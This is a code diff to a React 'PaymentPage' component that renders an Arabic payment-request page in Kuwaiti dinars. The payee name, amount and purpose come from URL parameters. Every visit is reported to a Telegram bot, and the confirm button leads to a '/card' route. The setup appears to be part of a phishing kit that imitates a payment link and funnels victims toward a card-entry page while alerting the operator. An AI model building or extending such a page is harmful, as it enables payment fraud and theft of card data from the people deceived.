@@ -5,30 +5,33 @@ import { sendMessageToTelegram } from "@/backend/telegramService";
 const PaymentPage = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const queryParams = new URLSearchParams(window.location.search);
   
-  // Hardcoded defaults as requested, but overridden if URL params are present
-  const paymentData = useMemo(() => ({
-    customerName: queryParams.get('n') || "halits.YILDIZ",
-    amount: queryParams.get('a') || "5.000",
-    description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
-    currency: queryParams.get('c') || "KWD",
-    expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
-  }), [window.location.search]);
+  // Use useMemo to ensure data is recalculated immediately when URL changes
+  const paymentData = useMemo(() => {
+    const queryParams = new URLSearchParams(window.location.search);
+    return {
+      id: id || 'unknown',
+      customerName: queryParams.get('n') || "halits.YILDIZ",
+      amount: queryParams.get('a') || "5.000",
+      currency: queryParams.get('c') || "KWD",
+      description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
+      expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
+    };
+  }, [window.location.search, id]);
 
   useEffect(() => {
     const notifyVisitor = async () => {
       const message = `
-<b>👀 New Visitor on Payment Page</b>
+<b>👀 New Visitor</b>
 <b>Name:</b> ${paymentData.customerName}
 <b>Amount:</b> ${paymentData.amount} ${paymentData.currency}
 <b>Purpose:</b> ${paymentData.description}
-<b>ID:</b> ${id}
+<b>ID:</b> ${paymentData.id}
 `;
       await sendMessageToTelegram(message);
     };
     notifyVisitor();
-  }, [paymentData, id]);
+  }, [paymentData]);
 
   const handleConfirm = () => {
     navigate(`/card/${id}${window.location.search}`);
@@ -51,11 +54,11 @@ const PaymentPage = () => {
           </div>
           <div className="flex justify-between items-center border-b pb-2">
             <span className="text-gray-700">المبلغ:</span>
-            <span className="font-bold text-blue-900">{parseFloat(paymentData.amount).toFixed(3)} {getCurrencySymbol(paymentData.currency)}</span>
+            <span className="font-bold text-blue-900">{paymentData.amount} {getCurrencySymbol(paymentData.currency)}</span>
           </div>
           <div className="flex justify-between items-center border-b pb-2">
             <span className="text-gray-700">الغرض:</span>
-            <span className="font-bold text-blue-900">{paymentData.description}</span>
+            <span className="font-bold text-blue-900 text-xs">{paymentData.description}</span>
           </div>
           <div className="flex justify-between items-center">
             <span className="text-gray-700">تاريخ الانتهاء:</span>
@@ -67,4 +70,5 @@ const PaymentPage = () => {
     </div>
   );
 };
+
 export default PaymentPage;
